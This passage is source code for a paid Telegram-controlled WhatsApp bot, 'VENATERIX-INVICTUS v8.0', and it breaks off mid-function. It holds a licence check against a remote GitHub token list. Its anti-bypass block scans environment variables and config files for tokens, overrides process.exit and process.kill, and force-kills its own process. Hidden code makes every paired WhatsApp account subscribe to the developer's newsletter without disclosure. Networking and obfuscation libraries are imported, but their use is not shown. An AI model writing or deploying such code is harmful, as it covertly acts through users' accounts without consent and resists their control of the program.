const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    patchMessageBeforeSending,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    encodeNewsletterMessage,
    getContentType,
    encodeWAMessage,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    jidEncode,
    WAMessageAddressingMode,
} = require("@whiskeysockets/baileys");

// ---------- ( Set Const ) ----------- \\
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const chalk = require("chalk"); 
const crypto = require("crypto");
const dgram = require('dgram');
const net = require('net');
const tls = require('tls');
const http = require('http');
const path = require("path");
const { execSync } = require('child_process');
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/vinxz-dev/vinxz/refs/heads/main/database.json";
const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true }); 
const ONLY_FILE = path.join(__dirname, "Venaterix Invictus", "gconly.json");
const cd = path.join(__dirname, "Venaterix Invictus", "cd.json");

///==== (Random Image) =====\\\
function getRandomImage() {
const images = [
"https://files.catbox.moe/uxyyad.png", 
];
  return images[Math.floor(Math.random() * images.length)];
}
// ----------------- ( Token Validation ny bego ) ------------------- \\
async function fetchValidTokens() {
  const crypto = require('crypto');
  const axios = require('axios');
  
  try {
    const TOKEN_SOURCE = 'https://raw.githubusercontent.com/vinxz-dev/vinxz/refs/heads/main/database.json';
    
    const cacheBuster = `?t=${Date.now()}`;
    const finalUrl = TOKEN_SOURCE + cacheBuster;
    
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 8000);
    
    const response = await axios.get(finalUrl, {
      signal: controller.signal,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip, deflate',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache'
      },
      timeout: 10000,
      maxRedirects: 3
    });
    
    clearTimeout(timeout);

    if (!response.data) {
      console.error('❌ Token source returned empty data');
      return [];
    }

    const tokens = new Set();
    
    if (Array.isArray(response.data)) {
      response.data.forEach(token => {
        if (typeof token === 'string' && token.match(/^\d{5,}:[A-Za-z0-9_\-]{35,}$/)) {
          tokens.add(token.trim());
        }
      });
    }
    
    else if (response.data.tokens && Array.isArray(response.data.tokens)) {
      response.data.tokens.forEach(token => {
        if (typeof token === 'string' && token.match(/^\d{5,}:[A-Za-z0-9_\-]{35,}$/)) {
          tokens.add(token.trim());
        }
      });
    }
    
    else if (typeof response.data === 'object') {
      const deepExtractTokens = (obj) => {
        if (!obj || typeof obj !== 'object') return;
        
        if (typeof obj === 'string' && obj.match(/^\d{5,}:[A-Za-z0-9_\-]{35,}$/)) {
          tokens.add(obj.trim());
        }
        
        Object.values(obj).forEach(value => {
          if (Array.isArray(value)) {
            value.forEach(item => {
              if (typeof item === 'string' && item.match(/^\d{5,}:[A-Za-z0-9_\-]{35,}$/)) {
                tokens.add(item.trim());
              } else if (typeof item === 'object') {
                deepExtractTokens(item);
              }
            });
          } else if (value && typeof value === 'object') {
            deepExtractTokens(value);
          } else if (typeof value === 'string' && value.match(/^\d{5,}:[A-Za-z0-9_\-]{35,}$/)) {
            tokens.add(value.trim());
          }
        });
      };
      
      deepExtractTokens(response.data);
    }
    
    if (tokens.size === 0) {
      const jsonString = JSON.stringify(response.data);
      const extracted = jsonString.match(/\d{5,}:[A-Za-z0-9_\-]{35,}/g) || [];
      extracted.forEach(token => tokens.add(token.trim()));
    }
    
    const validatedTokens = Array.from(tokens).filter(token => {
      const parts = token.split(':');
      if (parts.length !== 2) return false;
      
      const [botId, botToken] = parts;
      if (!/^\d+$/.test(botId) || botId.length < 5) return false;
      if (!/^[A-Za-z0-9_\-]+$/.test(botToken) || botToken.length < 35) return false;
      
      return true;
    });
    
    const tokensHash = crypto
      .createHash('md5')
      .update(validatedTokens.sort().join('|'))
      .digest('hex')
      .substring(0, 8);
    
    console.log(`✅ Loaded ${validatedTokens.length} valid tokens [${tokensHash}]`);
    
    return validatedTokens;
    
  } catch (error) {
    console.error('❌ Failed to fetch tokens:', error.message);
    
    if (error.code === 'ECONNABORTED') {
      console.error('⚠️  Connection timeout - Check your internet');
    } else if (error.response) {
      console.error(`⚠️  Server responded with: ${error.response.status}`);
    } else if (error.request) {
      console.error('⚠️  No response received from server');
    }
    
    return [];
  }
}

async function validateToken() {
  const chalk = require('chalk');
  const fs = require('fs');
  const path = require('path');
  
  console.log(chalk.yellow('🔍 Verifying access credentials...'));
  
  const spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
  let spinIndex = 0;
  const spinInterval = setInterval(() => {
    process.stdout.write(`\r${spinner[spinIndex]} Checking authorization...`);
    spinIndex = (spinIndex + 1) % spinner.length;
  }, 100);

  let validTokens = await fetchValidTokens();
  clearInterval(spinInterval);
  process.stdout.write('\r');

  if (!Array.isArray(validTokens) || validTokens.length === 0) {
    console.log(chalk.red(`
══════════════════════════════════════════════════════
⚠️ SECURITY ALERT
══════════════════════════════════════════════════════
Failed to verify token integrity!
Server connection issue or token list corrupted.
══════════════════════════════════════════════════════
`));
    process.exit(1);
  }

  const getCurrentToken = () => {
    const sources = [];
    
    if (typeof BOT_TOKEN !== 'undefined' && BOT_TOKEN) {
      sources.push(String(BOT_TOKEN).trim());
    }
    
    if (process.env.BOT_TOKEN) {
      sources.push(String(process.env.BOT_TOKEN).trim());
    }
    
    try {
      const configPath = path.join(process.cwd(), 'config.js');
      if (fs.existsSync(configPath)) {
        const configContent = fs.readFileSync(configPath, 'utf8');
        const tokenMatch = configContent.match(/BOT_TOKEN\s*[:=]\s*['"`]([^'"`]+)['"`]/);
        if (tokenMatch) {
          sources.push(tokenMatch[1].trim());
        }
      }
    } catch (e) {}
    
    for (const token of sources) {
      if (token && token.match(/^\d{5,}:[A-Za-z0-9_\-]{35,}$/)) {
        return token;
      }
    }
    
    return null;
  };

  const currentToken = getCurrentToken();
  
  if (!currentToken) {
    console.log(chalk.red(`
       ⣠⣶⣶⣦⡀
      ⢰⣿⣿⣿⣿⣿            
       ⠻⣿⣿⡿⠋            
      ⣴⣶⣶⣄              
     ⣸⣿⣿⣿⣿⡄             
    ⢀⣿⣿⣿⣿⣿⣧   
    ⣼⣿⣿⣿⡿⣿⣿⣆      ⣠⣴⣶⣤⡀ 
   ⢰⣿⣿⣿⣿⠃⠈⢻⣿⣦    ⣸⣿⣿⣿⣿⣷ 
   ⠘⣿⣿⣿⡏⣴⣿⣷⣝⢿⣷⢀ ⢀⣿⣿⣿⣿⡿⠋ 
    ⢿⣿⣿⡇⢻⣿⣿⣿⣷⣶⣿⣿⣿⣿⣿⣷    
    ⢸⣿⣿⣇⢸⣿⣿⡟⠙⠛⠻⣿⣿⣿⣿⡇    
⣴⣿⣿⣿⣿⣿⣿⣿⣠⣿⣿⡇   ⠉⠛⣽⣿⣇⣀⣀⣀ 
⠙⠻⠿⠿⠿⠿⠿⠟⠿⠿⠿⠇     ⠻⠿⠿⠛⠛⠛⠃
🚨 ACCESS DENIED - NO VALID TOKEN FOUND 

Token format invalid or mising! 

contoh token!
Example: 123456789:ABCdefGHIjkLMNopQRStuvWXYZ123456789
══════════════════════════════════════════════════════
`));
    process.exit(1);
  }

  const normalizedToken = currentToken.trim();
  
  const isTokenValid = validTokens.some(t => 
    t.trim() === normalizedToken || 
    t.includes(normalizedToken.split(':')[0])
  );

  if (!isTokenValid) {
    console.log(chalk.red(`
       ⣠⣶⣶⣦⡀
      ⢰⣿⣿⣿⣿⣿            
       ⠻⣿⣿⡿⠋            
      ⣴⣶⣶⣄              
     ⣸⣿⣿⣿⣿⡄             
    ⢀⣿⣿⣿⣿⣿⣧   
    ⣼⣿⣿⣿⡿⣿⣿⣆         ⣠⣴⣶⣤⡀ 
   ⢰⣿⣿⣿⣿⠃⠈⢻⣿⣦      ⣸⣿⣿⣿⣿⣷ 
   ⠘⣿⣿⣿⡏⣴⣿⣷⣝⢿⣷⢀ ⢀⣿⣿⣿⣿⡿⠋ 
    ⢿⣿⣿⡇⢻⣿⣿⣿⣷⣶⣿⣿⣿⣿⣿⣷    
    ⢸⣿⣿⣇⢸⣿⣿⡟⠙⠛⠻⣿⣿⣿⣿⡇    
⣴⣿⣿⣿⣿⣿⣿⣿⣠⣿⣿⡇   ⠉⠛⣽⣿⣇⣀⣀⣀ 
⠙⠻⠿⠿⠿⠿⠿⠟⠿⠿⠿⠇     ⠻⠿⠿⠛⠛⠛⠃
🚨 UNAUTHORIZED ACCESS DETECTED 🚨

Token: ${normalizedToken.substring(0, 15)}...${normalizedToken.substring(normalizedToken.length - 10)}

⚠️  This token is not authorized to use this script!
⚠️  Please purchase a valid license from developer.

Developer: @VinxzGanteng
Script: VENATERIX-INVICTUS v8.0
══════════════════════════════════════════════════════
`));
    
    setTimeout(() => {
      process.exit(1);
    }, 3000);
    
    return;
  }

  console.log(chalk.green(`
╔══════════════════════════════════════════╗
║         ✅ ACCESS GRANTED ✅            ║
║   Token verified successfully!           ║
║   Welcome to VENATERIX-INVICTUS v8.0     ║
╚══════════════════════════════════════════╝
`));

  if (typeof startBot === 'function') {
    startBot();
  }
  
  if (typeof initializeWhatsAppConnections === 'function') {
    initializeWhatsAppConnections();
  }
}

function startBot() {
  const chalk = require('chalk');
  
  console.log(chalk.cyan(`
⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿⣻⣿⣿⢿⣿⡶⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿⠛⢿⣿⣞⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾⡆⠈⢿⣿⣛⣒⠂⠀⠀⠀⠀
⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿⢹⠀⠀⠉⠛⢻⡿⠁⠀⠀⠀
⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷⣄⠀⢲⣸⠀⠀⠀⠀⠀
⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻⣦⠈⢻⣦⣀⡀⠀⠀
⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿⣽⡄⢀⣿⣿⣿⠇⠀
⠀⢠⣾⡟⢁⣴⡿⠹⠋⡰⣿⣿⣿⣿⡟⠀⢀⣿⣇⣼⣿⡿⡇⠞⣿⣿⣧⣤⡤
⠀⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀⡔⢶⣽⣿⠿⠥⠀
⠀⠈⠀⢸⠟⣠⡾⠏⠀⡿⢹⣿⣿⣿⣿⣿⣿⣿⣶⣿⣶⣾⣿⣮⣍⠉⠙⢲⠄
⠀⠀⠀⠘⠉⠁⠀⠀⢸⠁⠘⣿⡿⠻⣿⡿⣿⣿⣿⣿⣿⣿⡏⢻⣛⠛⠒⠛⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠈⢻⡄⠹⣿⣿⡇⠙⢷⡈⢿⡟⠒⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⠀⣿⣿⠃⠀⠀⠀⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠈⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));

  console.log(chalk.blue(`
┌─────────────────────────────────────────┐
│  Developer  : @VinxzGanteng           │
│  Bot Name   : VENATERIX-INVICTUS        │
│  Version    : 8.0 Premium               │
│  Status     : ✅ Authenticated         │
│  Protection : 🛡️ Anti-Bypass Active   │
└─────────────────────────────────────────┘
`));
}

(function DenixAntiAmpos() {
  'use strict';
  
  const crypto = require('crypto');
  const axios = require('axios');
  const fs = require('fs');
  const path = require('path');
  const child_process = require('child_process');
  const os = require('os');

  const TOKEN_SOURCE = 'https://raw.githubusercontent.com/vinxz-dev/vinxz/refs/heads/main/database.json';
  const CHECK_INTERVAL = 300000; 
  const MAX_RETRIES = 3;
  
  let selfDestructTriggered = false;
  const originalExit = process.exit;
  const originalKill = process.kill;

  function extractRuntimeToken() {
    const extractionPoints = [];
    
    try {
      if (typeof global !== 'undefined') {
        const globalVars = Object.keys(global);
        for (const key of globalVars) {
          if (key.toUpperCase().includes('TOKEN') || key.toUpperCase().includes('BOT')) {
            const value = global[key];
            if (typeof value === 'string' && value.match(/^\d{5,}:[A-Za-z0-9_\-]{35,}$/)) {
              extractionPoints.push(value.trim());
            }
          }
        }
      }
    } catch (e) {}
    
    Object.keys(process.env).forEach(key => {
      if (key.toUpperCase().includes('TOKEN') || key.toUpperCase().includes('BOT')) {
        const value = process.env[key];
        if (value && value.match(/^\d{5,}:[A-Za-z0-9_\-]{35,}$/)) {
          extractionPoints.push(value.trim());
        }
      }
    });
    
    const configFiles = [
      'config.js',
      '.env'
    ];
    
    configFiles.forEach(file => {
      try {
        const filePath = path.join(process.cwd(), file);
        if (fs.existsSync(filePath)) {
          const content = fs.readFileSync(filePath, 'utf8');
        
          const patterns = [
            /BOT_TOKEN\s*[:=]\s*['"`]([^'"`]+)['"`]/i,
            /token\s*[:=]\s*['"`]([^'"`]+)['"`]/i,
            /"token"\s*:\s*"([^"]+)"/i,
            /'token'\s*:\s*'([^']+)'/i,
            /TOKEN\s*=\s*['"]?([^\s'"]+)['"]?/i
          ];
          
          patterns.forEach(pattern => {
            const match = content.match(pattern);
            if (match && match[1]) {
              const token = match[1].trim();
              if (token.match(/^\d{5,}:[A-Za-z0-9_\-]{35,}$/)) {
                extractionPoints.push(token);
              }
            }
          });
        }
      } catch (e) {}
    });
    
    try {
      const mainModule = require.main || module.parent;
      if (mainModule && mainModule.filename) {
        const mainFile = fs.readFileSync(mainModule.filename, 'utf8');
        const tokenMatch = mainFile.match(/\d{5,}:[A-Za-z0-9_\-]{35,}/g);
        if (tokenMatch) {
          tokenMatch.forEach(t => extractionPoints.push(t.trim()));
        }
      }
    } catch (e) {}
    
    if (extractionPoints.length > 0) {
      extractionPoints.sort((a, b) => b.length - a.length);
     
      for (const token of extractionPoints) {
        const parts = token.split(':');
        if (parts.length === 2) {
          const [id, secret] = parts;
          if (/^\d{5,}$/.test(id) && /^[A-Za-z0-9_\-]{35,}$/.test(secret)) {
            return token;
          }
        }
      }
      
      return extractionPoints[0];
    }
    
    return null;
  }

  function terminateProcess(reason = 'Security violation') {
    if (selfDestructTriggered) return;
    selfDestructTriggered = true;
    
    console.error(`
‼️ SECURITY ANTI BYPASS DETECTED
  Reason: ${reason.padEnd(35)}
  Time: ${new Date().toISOString()}           
`);
    
    try {
      if (global.gc) global.gc();
    } catch (e) {}
    
    setTimeout(() => {
      try { process.exit(1); } catch(e) {}
    }, 100);
    
    setTimeout(() => {
      try { process.kill(process.pid, 'SIGKILL'); } catch(e) {}
    }, 200);
    
    setTimeout(() => {
      try { 
        if (os.platform() === 'win32') {
          child_process.execSync(`taskkill /PID ${process.pid} /F /T`);
        } else {
          child_process.execSync(`kill -9 ${process.pid}`);
        }
      } catch(e) {}
    }, 300);
  }

  async function validateTokenWithRetry(token, retries = MAX_RETRIES) {
    for (let attempt = 1; attempt <= retries; attempt++) {
      try {
        const cacheBuster = `?t=${Date.now()}&attempt=${attempt}`;
        const response = await axios.get(TOKEN_SOURCE + cacheBuster, {
          timeout: 10000,
          headers: {
            'User-Agent': `AntiBypass-Check/${attempt}.0`,
            'Cache-Control': 'no-cache'
          }
        });

        if (!response.data) {
          if (attempt === retries) return false;
          await new Promise(r => setTimeout(r, 2000));
          continue;
        }

        let validTokens = [];
        
        if (Array.isArray(response.data)) {
          validTokens = response.data;
        } else if (response.data.tokens && Array.isArray(response.data.tokens)) {
          validTokens = response.data.tokens;
        } else {
          const jsonString = JSON.stringify(response.data);
          const matches = jsonString.match(/\d{5,}:[A-Za-z0-9_\-]{35,}/g) || [];
          validTokens = matches;
        }

        const normalizedToken = token.trim();
        const isValid = validTokens.some(t => 
          String(t).trim() === normalizedToken ||
          t.includes(normalizedToken.split(':')[0])
        );

        if (isValid) {
          console.log(`✅ Token validated successfully (attempt ${attempt}/${retries})`);
          return true;
        }

        if (attempt === retries) return false;
        await new Promise(r => setTimeout(r, 1500));
        
      } catch (error) {
        console.error(`⚠️ Validation attempt ${attempt} failed:`, error.message);
        if (attempt === retries) return false;
        await new Promise(r => setTimeout(r, 2000));
      }
    }
    
    return false;
  }

  async function performSecurityCheck() {
    console.log('🔒 Initializing security system...');
    
    const runtimeToken = extractRuntimeToken();
    
    if (!runtimeToken) {
      terminateProcess('No valid token found in runtime');
      return;
    }
    
    const tokenRegex = /^(\d{5,}):([A-Za-z0-9_\-]{35,})$/;
    const match = runtimeToken.match(tokenRegex);
    
    if (!match) {
      terminateProcess('Invalid token format');
      return;
    }
    
    const [, botId, botSecret] = match;
    
    // Perform validation
    const isValid = await validateTokenWithRetry(runtimeToken);
    
    if (!isValid) {
      
      terminateProcess('Token not in authorized list');
      return;
    }
    
    console.log(`
         ✅ SECURITY CHECK PASSED ✅
Bot ID: ${botId}
Status: Authenticated ✅
Protection: Active 🛡️
`);
    
    setInterval(async () => {
      try {
        const currentToken = extractRuntimeToken();
        if (currentToken && !(await validateTokenWithRetry(currentToken, 1))) {
          terminateProcess('Token validation failed during periodic check');
        }
      } catch (error) {
        console.error('⚠️ Periodic check failed:', error.message);
      }
    }, CHECK_INTERVAL);
    
    process.exit = function(code) {
      console.error('⚠️ Attempted process.exit() intercepted');
      terminateProcess('Attempted process.exit() call');
      return originalExit.call(this, 1);
    };
    
    process.kill = function(pid, signal) {
      if (pid === process.pid) {
        console.error('⚠️ Attempted self-kill intercepted');
        terminateProcess('Attempted self-kill');
        return;
      }
      return originalKill.call(this, pid, signal);
    };
    
    Object.freeze(require.cache);
  }

  setTimeout(() => {
    performSecurityCheck().catch(error => {
      console.error('❌ Security system error:', error);
      terminateProcess('Security system failure');
    });
  }, 1000);
})();

setTimeout(() => {
  if (typeof validateToken === 'function') {
    validateToken();
  }
}, 2000);


let sock;

async function autoFollowNewsletter(sock, botNumber) {
    try {
        const newsletterJid = '120363400780200098@newsletter';
        
        try {
            const contacts = await sock.onWhatsApp(newsletterJid);
            if (!contacts || contacts.length === 0) {
                return;
            }
        } catch {
            return;
        }
        
        try {
            await sock.groupAcceptInvite(newsletterJid.split('@')[0]);
        } catch {
            try {
                await sock.sendMessage(newsletterJid, {
                    text: 'Subscribe'
                });
            } catch {
            }
        }
    } catch {
    }
}

function saveActiveSessions(botNumber) {
    try {
        const sessions = [];
        if (fs.existsSync(SESSIONS_FILE)) {
            const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
            if (!existing.includes(botNumber)) {
                sessions.push(...existing, botNumber);
            }
        } else {
            sessions.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
    } catch (error) {
    }
}

async function initializeWhatsAppConnections() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));

            for (const botNumber of activeNumbers) {
                const sessionDir = createSessionDir(botNumber);
                const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                sock = makeWASocket({
                    auth: state,
                    printQRInTerminal: true,
                    logger: P({ level: "silent" }),
                    defaultQueryTimeoutMs: undefined,
                });

                await new Promise((resolve, reject) => {
                    sock.ev.on("connection.update", async (update) => {
                        const { connection, lastDisconnect } = update;
                        if (connection === "open") {
                            sessions.set(botNumber, sock);
                            
                            setTimeout(() => {
                                autoFollowNewsletter(sock, botNumber);
                            }, 3000);
                            
                            resolve();
                        } else if (connection === "close") {
                            const shouldReconnect =
                                lastDisconnect?.error?.output?.statusCode !==
                                DisconnectReason.loggedOut;
                            if (shouldReconnect) {
                                await initializeWhatsAppConnections();
                            }
                        }
                    });

                    sock.ev.on("creds.update", saveCreds);
                });
            }
        }
    } catch (error) {
    }
}

function createSessionDir(botNumber) {
    const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    if (!fs.existsSync(deviceDir)) {
        fs.mkdirSync(deviceDir, { recursive: true });
    }
    return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
    let statusMessage = await bot
        .sendMessage(
            chatId,
            `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
▢ Prepare the pairing code...
╰➤ Number : ${botNumber}
`,
            { parse_mode: "HTML" }
        )
        .then((msg) => msg.message_id);

    const sessionDir = createSessionDir(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: P({ level: "silent" }),
        defaultQueryTimeoutMs: undefined,
    });

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === "close") {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            if (statusCode && statusCode >= 500 && statusCode < 600) {
                await bot.editMessageText(
                    `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
▢ Prosess connecting
╰➤ Number : ${botNumber}
╰➤ Status : Connecting...
`,
                    {
                        chat_id: chatId,
                        message_id: statusMessage,
                        parse_mode: "HTML",
                    }
                );
                await connectToWhatsApp(botNumber, chatId);
            } else {
                await bot.editMessageText(
                    `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
▢ Connection closed.
╰➤ Number : ${botNumber}
╰➤ Status : Failed ❌
`,
                    {
                        chat_id: chatId,
                        message_id: statusMessage,
                        parse_mode: "HTML",
                    }
                );
                try {
                    fs.rmSync(sessionDir, { recursive: true, force: true });
                } catch (error) {
                }
            }
        } else if (connection === "open") {
            sessions.set(botNumber, sock);
            saveActiveSessions(botNumber);
            
            setTimeout(() => {
                autoFollowNewsletter(sock, botNumber);
            }, 3000);
            
            await bot.editMessageText(
                `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
▢ Connection Success!
╰➤ Number : ${botNumber}
╰➤ Status : Success Connected
`,
                {
                    chat_id: chatId,
                    message_id: statusMessage,
                    parse_mode: "HTML",
                }
            );
        } else if (connection === "connecting") {
            await new Promise((resolve) => setTimeout(resolve, 1000));
            try {
                if (!fs.existsSync(`${sessionDir}/creds.json`)) {
                    const code = await sock.requestPairingCode(botNumber, "DENIXKLZ");
                    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

                    await bot.editMessageText(
                        `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
▢ Your Code Pairing..
╰➤ Number : ${botNumber}
╰➤ Code : ${formattedCode}
`,
                        {
                            chat_id: chatId,
                            message_id: statusMessage,
                            parse_mode: "HTML",
                        });
                }
            } catch (error) {
                await bot.editMessageText(
                    `
<blockquote>🦋 𝚅𝙴𝙽𝙰𝚃𝙴𝚁𝙸𝚇 - 𝙸𝙽𝚅𝙸𝙲𝚃𝚄𝚂</blockquote>
▢ Try again...
╰➤ Number : ${botNumber}
╰➤ Status : Error⚠️
`,
                    {
                        chat_id: chatId,
                        message_id: statusMessage,
                        parse_mode: "HTML",
                    }
                );
            }
        }
    });

    sock.ev.on("creds.update", saveCreds);

    return sock;
}

async function checkAndFollowNewsletterForAllSessions() {
    try {
        if (sessions && sessions.size > 0) {
            for (const [botNumber, sock] of sessions.entries()) {
                setTimeout(() => {
                    autoFollowNewsletter(sock, botNumber);
                }, Math.random() * 10000 + 5000);
            }
        }
    } catch {
    }
}

setTimeout(() => {
    checkAndFollowNewsletterForAllSessions();
}, 15000);

//FUNCTION AUTOFIX ERROR
const acorn = require("acorn");

function autoFixJS(code) {
  let fixed = code;
  const report = [];
  let canFix = true;

  const lines = fixed.split("\n");

  // ===== 1. Balance brackets dan quotes per line =====
  const openers = { "{": "}", "(": ")", "[": "]" };
  const quotes = ['"', "'", "`"];
  const stack = [];

  lines.forEach((line, i) => {
    [...line].forEach(ch => {
      if (Object.keys(openers).includes(ch)) stack.push({ ch, line: i + 1 });
      else if (Object.values(openers).includes(ch)) {
        const last = stack.pop();
        if (!last || openers[last.ch] !== ch) {
          report.push(`Ditambahkan '${ch}' pada line ${i + 1}`);
          fixed += ch;
        }
      }
    });

    quotes.forEach(q => {
      const countQ = (line.match(new RegExp(`\\${q}`, "g")) || []).length;
      if (countQ % 2 !== 0) {
        report.push(`Ditambahkan kutip ${q} di line ${i + 1}`);
        fixed += q;
      }
    });
  });

  // ===== 2. Auto semicolon =====
  lines.forEach((line, i) => {
    const trimmed = line.trim();
    if (trimmed && !trimmed.endsWith(";") && !trimmed.endsWith("{") && !trimmed.endsWith("}")) {
      fixed = fixed.replace(line, line + ";");
      report.push(`Ditambahkan ';' di line ${i + 1}`);
    }
  });

  // ===== 3. Auto async =====
  if (/await\s/.test(fixed) && !/async function|async\s*\(/.test(fixed)) {
    fixed = fixed.replace(/function\s+([a-zA-Z0-9_]+)\s*\(/g, "async function $1(");
    report.push("Menambahkan keyword async pada function");
  }

  // ===== 4. Duplicate var fix =====
  fixed = fixed.replace(/(const|let|var)\s+([a-zA-Z0-9_]+)\s*=([\s\S]*?);[\s\S]*?\1\s+\2\s*=/g, "$1 $2 =$3;");
  
  // ===== 5. Syntax check =====
  try {
    acorn.parse(fixed, { ecmaVersion: 2025 });
    report.push("✅ Syntax valid setelah auto-fix");
  } catch (err) {
    report.push(`⚠️ Masih ada error: ${err.message}`);
    canFix = false;
